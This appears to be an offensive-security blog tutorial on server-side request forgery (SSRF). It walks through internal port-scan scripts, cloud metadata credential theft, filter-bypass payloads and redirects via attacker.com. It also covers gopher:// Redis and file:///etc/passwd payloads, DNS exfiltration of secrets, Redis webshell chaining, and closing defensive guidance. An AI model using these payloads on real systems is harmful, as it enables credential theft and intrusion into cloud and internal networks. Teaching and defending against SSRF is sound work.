---
title: "SSRF Deep Dive: From Internal Services to Cloud Metadata"
date: 2026-04-25 00:00:00 +0300
categories: [Web Security, Pentest]
tags: [ssrf, cloud-security, aws, web-security, offensive-security, pentest]
description: "From basic internal port scanning to AWS/GCP metadata exploitation — SSRF walked through real pentest scenarios, filter bypasses, and cloud attack paths."
image:
  path: /assets/rain.gif
  alt: "JWT attacks cover"
toc: true
---

Server-Side Request Forgery (SSRF) is one of those vulnerabilities that looks small at first — "the server fetches a URL I give it, so what?" — and ends up being the reason a company's entire cloud infrastructure goes on HackerOne's front page. Modern web apps pull images, validate webhooks, import files, render previews, proxy API calls. Every one of those is a potential SSRF entry point. And once the server makes a request you control, the game shifts from "bypass the frontend" to "what can I reach from inside their network?"

This post walks through SSRF the way I actually attack it on engagements: start with the basics, move through filter bypasses, and finish on cloud metadata — which is where SSRF goes from a medium to a critical.

## What SSRF Actually Is

The pattern is simple. The server takes a URL (directly or indirectly from user input) and makes an HTTP request to it. That's it. The bug is that the server has access to places you don't:

- Internal services (`127.0.0.1`, `10.0.0.0/8`, `192.168.0.0/16`)
- Admin panels reachable only from localhost
- Databases listening on internal IPs
- Cloud metadata endpoints (`169.254.169.254`)
- Other microservices on the same VPC

Typical SSRF entry points:

- Avatar/profile picture URL uploads
- PDF/image generators that fetch remote resources
- Webhook URL configuration
- URL preview features ("unfurl this link")
- XML parsers with external entity support (XXE turning into SSRF)
- Proxy/fetcher endpoints (`/api/fetch?url=...`)
- OAuth/SAML callback handlers
- File import from URL

First instinct on any engagement: grep the app for features that accept a URL. Every one is a candidate.

## Scenario 1 — Classic Internal Port Scan

**Situation.** You find a profile settings page where you can set an "avatar URL." The server fetches that URL, downloads the image, and displays it on your profile.

**Attack.** Point the avatar URL at internal addresses and watch the response:

```
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080
http://localhost:9200
```

You won't usually see the raw response body, but the server's reaction tells you everything:

- **Connection refused / instant error** → port closed
- **Hangs then times out** → port likely open but not speaking HTTP (SSH, databases)
- **"Invalid image format" error** → port open, got a response, but not a valid image
- **Different error for different ports** → you've got an oracle

That last one is gold. Any observable difference between "open port" and "closed port" gives you a scanner. Wrap it in a script:

```python
import requests

TARGET = "https://target.com/api/avatar"
COOKIE = {"session": "..."}

for port in [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 11211, 27017]:
    r = requests.post(
        TARGET,
        cookies=COOKIE,
        json={"avatar_url": f"http://127.0.0.1:{port}"}
    )
    print(f"{port}: {r.status_code} | {len(r.text)} bytes | {r.elapsed.total_seconds()}s")
```

Response size and timing are usually enough to fingerprint what's running. Redis on 6379 hangs until timeout; Elasticsearch on 9200 returns valid JSON; MySQL on 3306 closes immediately after getting HTTP garbage.

**What to do next.** Once you've mapped the ports, pivot to HTTP-speaking services. Internal admin panels, Jenkins, Kibana, actuator endpoints, service discovery registries — all of these commonly sit on internal ports with no auth because "only internal traffic reaches them."

## Scenario 2 — Cloud Metadata (The One That Matters)

This is where SSRF turns into a P1 finding.

Every major cloud provider exposes a metadata service on a link-local address that's reachable only from the instance itself. Hit it from outside, nothing. Hit it through an SSRF from inside, and you get credentials, user data, instance configuration.

### AWS — The Big One

The classic endpoint:

```
http://169.254.169.254/latest/meta-data/
```

What you actually want:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

This lists the IAM roles attached to the instance. Grab the role name from the response, then:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```

Response looks something like:

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "IQoJb3JpZ2luX2VjE...",
  "Expiration": "2026-04-25T18:00:00Z"
}
```

You now have temporary AWS credentials tied to the instance role. Export them and run `aws sts get-caller-identity` — you're inside the customer's AWS account.

What you do next depends on the role's permissions. I've seen roles that could list every S3 bucket in the org, roles that could read secrets from AWS Secrets Manager, roles that could spin up EC2 instances. The blast radius is whatever IAM policy the role has.

### IMDSv2 — The Complication

AWS pushed IMDSv2 as a defense, and it's good. IMDSv2 requires a session token obtained via `PUT`:

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

Most SSRF primitives only give you `GET`. If IMDSv2 is enforced (and the hop limit is 1), pure SSRF usually won't cut it — you need a primitive that can send `PUT` with custom headers. A lot of bug bounty SSRF findings die here.

But: many deployments still have IMDSv1 enabled for backwards compatibility, or they set a hop limit of 2+ (which lets containers running on the host reach metadata). Always check v1 first, then assess whether the SSRF primitive can do v2.

### GCP — Requires a Header

```
http://metadata.google.internal/computeMetadata/v1/
```

Needs the `Metadata-Flavor: Google` header. If your SSRF can set custom headers (or the vulnerable code sets it for you), you get instance metadata, service account tokens, project info.

Critical path:

```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Gives you an OAuth access token for the instance's service account.

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

Needs `Metadata: true` header. Token endpoint:

```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### DigitalOcean, Alibaba, Oracle

They all have their own metadata endpoints too. HackTricks maintains a comprehensive list that's worth bookmarking. On any cloud-hosted target, check every provider's metadata endpoint — you don't always know where the app is actually hosted.

## Scenario 3 — URL Filter Bypasses

So the developer read an OWASP article and added a blocklist. "We reject requests to `127.0.0.1`, `localhost`, `169.254.169.254`, and internal IP ranges." Good for them. Now for the fun part.

### IP Representation Tricks

`127.0.0.1` has dozens of equivalents, and URL parsers disagree on which are valid:

```
http://127.1
http://127.0.1
http://0.0.0.0
http://0/
http://0177.0.0.1            (octal)
http://2130706433            (decimal)
http://0x7f.0.0.1            (hex)
http://0x7f000001            (hex, packed)
http://[::1]                 (IPv6 loopback)
http://[::ffff:127.0.0.1]    (IPv4-mapped IPv6)
```

If the filter does a string check for `127.0.0.1` but the underlying HTTP client resolves `2130706433` to the same address, you win.

### DNS-Based Bypasses

If the filter blocks IPs but allows hostnames, register a DNS name that resolves to the target:

```
127.0.0.1.nip.io          → resolves to 127.0.0.1
169.254.169.254.nip.io    → resolves to 169.254.169.254
```

`nip.io` and `sslip.io` are free and legal for this — they exist precisely to resolve patterns like `<ip>.nip.io` back to that IP.

**DNS rebinding.** Nastier variant. Register a domain whose DNS record TTL is ~0. First resolution returns a public IP (passing the filter's resolve-then-check logic). Second resolution, milliseconds later when the server actually makes the HTTP request, returns an internal IP. Tools like `singularity` automate this. This beats filters that validate the hostname's resolved IP separately from the fetch.

### URL Parser Confusion

The vulnerability often lives in a mismatch between what the filter parses and what the HTTP client fetches. Classic patterns:

```
http://evil.com@127.0.0.1/
http://127.0.0.1#@evil.com/
http://evil.com\@127.0.0.1/
http://evil.com%23@127.0.0.1/
http://127.0.0.1:80@evil.com/
```

Some parsers read the host as `evil.com`, others as `127.0.0.1`. The filter and the HTTP library may disagree — and when they do, that's an SSRF.

### Redirect Chains

Many SSRF filters validate the first URL but follow redirects blindly. Host a server on `attacker.com/redirect.php` that returns `302 Location: http://169.254.169.254/latest/meta-data/`. Pass `http://attacker.com/redirect.php` to the target. Filter passes (it's a public domain), HTTP client follows the redirect, you land on metadata.

### Protocol Smuggling

If the fetcher supports protocols beyond HTTP:

```
gopher://127.0.0.1:6379/_SET%20foo%20bar    (Redis)
dict://127.0.0.1:11211/stat                  (memcached)
file:///etc/passwd                           (local files!)
ftp://internal.server/                       (internal FTP)
```

`gopher://` is particularly dangerous because it lets you craft arbitrary TCP payloads — which means you can talk to Redis, memcached, or any line-based protocol directly. A Redis SSRF via gopher is how you go from "I can make requests" to "I can write arbitrary keys, overwrite session data, or trigger code execution via `CONFIG SET`."

## Scenario 4 — Blind SSRF

Sometimes the response never comes back. The server fetches the URL but you don't see the result. How do you know it worked?

### Out-of-Band Callbacks

Set up a listener (Burp Collaborator, `interactsh`, your own DNS server) and point the SSRF at a domain you control:

```
http://<your-burp-collab-id>.oastify.com
```

If you get a DNS lookup or HTTP request on your listener, the SSRF is firing. This confirms the bug but doesn't give you data.

### Timing Oracles

Even without response data, timing leaks. Open ports respond fast, closed ports time out. Existing files read fast, missing files error quickly. With enough requests, you can enumerate internal services through timing alone.

### Error-Based Leaks

Sometimes the error message itself leaks. `ConnectionRefusedError` vs `ConnectionTimeoutError` vs `SSLHandshakeError` all tell you something different about the target. If the app echoes error messages back to the UI, every error is an information leak.

### DNS Exfiltration

If you can read data but can't send it back directly, exfiltrate via DNS:

```
http://<base64-of-secret>.attacker.com
```

The server does a DNS lookup for your subdomain, your authoritative DNS server logs the query, you decode the base64. Slow but works for small payloads (API keys, tokens) when nothing else does.

## Scenario 5 — SSRF Into Something Bigger

SSRF is rarely the final bug. It's a pivot. A few patterns:

**SSRF → RCE via Redis.** If internal Redis is reachable and has no auth (common), use gopher to write a malicious key or change config via `CONFIG SET dir` + `CONFIG SET dbfilename` to write webshells to disk.

**SSRF → RCE via Jenkins/other admin UIs.** Internal Jenkins with default settings, Groovy console, script console — you're one request from code execution if you can reach the admin panel.

**SSRF → full AWS takeover.** Metadata creds → enumerate IAM → find over-privileged role → escalate. The `weirdAAL` and `pacu` toolkits are made for this phase.

**SSRF → internal service auth bypass.** Many internal services trust requests from internal IPs without additional auth. A service that rejects `X-Forwarded-For: attacker.com` but accepts `X-Forwarded-For: 127.0.0.1` is a classic. SSRF lets you be "internal."

## Mini Lab — PortSwigger's SSRF Labs

The PortSwigger Web Security Academy SSRF track is the best free practice I know of. If you're new to SSRF, these labs in order:

1. **Basic SSRF against the local server** — just the fundamentals, point at localhost.
2. **Basic SSRF against another back-end system** — internal network scan.
3. **SSRF with blacklist-based input filter** — teaches you the IP representation tricks from Scenario 3.
4. **SSRF with filter bypass via open redirection** — the redirect chain trick.
5. **Blind SSRF with out-of-band detection** — Burp Collaborator in action.
6. **Blind SSRF with Shellshock exploitation** — older, but teaches chaining.

Running through all six gives you a better SSRF instinct than reading ten writeups. What you want to build is a pattern-match reflex: see a URL input, immediately think about what internal services might live behind it.

## A Quick Pentest Checklist

When you spot a URL input, in order:

1. Point at `http://127.0.0.1:<port>` across common ports (22, 80, 443, 3306, 5432, 6379, 8080, 9200, 11211).
2. Check cloud metadata endpoints (AWS, GCP, Azure — all three, you don't always know the provider).
3. Try IP representation bypasses if internal IPs are filtered.
4. Try hostname tricks (`nip.io`, DNS rebinding) if hostnames are allowed but IPs aren't.
5. Try URL parser confusion (`@`, `#`, `\`).
6. Try redirect chains through a server you control.
7. Try non-HTTP protocols (`gopher://`, `file://`, `dict://`).
8. If no response is reflected, set up out-of-band detection.
9. Use timing as an oracle if nothing else works.
10. Once you have SSRF confirmed, think about what it chains into — Redis, Jenkins, IAM roles, internal auth bypass.

## Defense — For When You're Building, Not Breaking

If you're the one building the feature that fetches URLs:

- **Strict allowlist** of domains/IPs the app is allowed to fetch. Not a blocklist — blocklists always lose.
- **Resolve the hostname yourself** and verify the IP isn't in RFC 1918 ranges, link-local, or loopback. Block `169.254.169.254` specifically.
- **Re-verify the IP at request time** to mitigate DNS rebinding (or use a library that does this).
- **Disable redirect following**, or re-validate every redirect target against the allowlist.
- **Disable protocols other than HTTP/HTTPS** in your HTTP client.
- **On AWS, enforce IMDSv2 with hop limit 1**. This single setting kills most SSRF-to-metadata paths.
- **Isolate fetcher services** in a VPC/subnet that doesn't have network access to internal admin surfaces.

Most SSRF findings are the result of skipping one of these. Usually more than one.

## Closing

SSRF looks like a small bug. It reads like "the server made a request I asked it to." But in practice, it's a doorway from "I'm a random user on the internet" to "I'm inside your VPC with your cloud credentials." The gap between "low severity" and "critical" is almost always whether the target happens to run on a cloud instance with a reachable metadata endpoint.

If you're learning offensive security, SSRF is worth real time. The filter-bypass game teaches you how URL parsers, HTTP libraries, and DNS resolvers disagree — which is a useful skill that shows up everywhere, not just here. And on bug bounty, a well-chained SSRF is still one of the higher-paying finds out there.

The JWT `jku` header I wrote about [a few days ago](/posts/jwt-attacks/) is actually a perfect SSRF entry point — the server fetching an attacker-controlled URL is the whole point of the attack. Keep an eye on patterns like that. Most bugs don't live alone.
